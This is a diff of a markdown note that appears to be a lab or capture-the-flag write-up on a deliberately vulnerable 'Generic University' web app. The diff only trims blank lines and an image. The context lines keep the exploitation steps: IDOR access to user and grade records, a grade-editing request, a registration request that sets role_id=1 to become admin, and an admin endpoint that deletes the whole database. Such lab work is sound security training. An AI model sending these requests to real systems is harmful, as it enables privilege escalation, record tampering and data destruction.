@@ -160,7 +160,6 @@ users:
 
 {"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}
 
-
 now login
 
 johnathon71@rolfson.com
@@ -390,10 +389,7 @@ grade=1000&comments=1337 :)
 
 {"id":12,"grade":"1000","comments":"1337 :)","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2023-03-17T21:27:34.000000Z","user_id":3,"uni_class_id":2}
 
-
 ```
-
-![[Pasted image 20230317124824.png]]
 
 What API endpoint may allow someone to edit a grade?
 
@@ -408,7 +404,6 @@ What API endpoint shows all individuals holding accounts?
 What API endpoint shows all the possible courses on Generic University?
 
 *GET /api/classes*
-
 
 ### Get an account
 
@@ -454,8 +449,6 @@ Progress: 4614 / 4615 (99.98%)
 ===============================================================
 2023/03/17 14:42:29 Finished
 ===============================================================
-
-
 
 http://10.10.106.64/api/users
 
@@ -540,11 +533,9 @@ vuln: IDOR on most endpoints
 
 vuln: IDOR on most endpoints
 
-
 GET /api/admin HTTP/1.1
 
 [{"endpoint":"\/","desc":"Shows this manual"},{"endpoint":"restore","desc":"Restores the database from last manual backup"},{"endpoint":"delete","desc":"deletes everything from the database NO BACKUP"}]
-
 
 ```
 
@@ -575,7 +566,6 @@ POST /register HTTP/1.1
 
 _token=k..&name=w&email=w%40gmail.com&password=TSsMwEwRWWb6YDa&password_confirmation=TSsMwEwRWWb6YDa&role_id=1
 
-
 ```
 
 What is the path of the first admin panel (security vulnerabilities)?
@@ -589,6 +579,5 @@ What is the path of the second admin panel (delete and restore)?
 What is the request that deletes all the data format: [HTTP method] [path]
 
 *GET /api/admin/delete*
-
 
 [[hackerNote]]
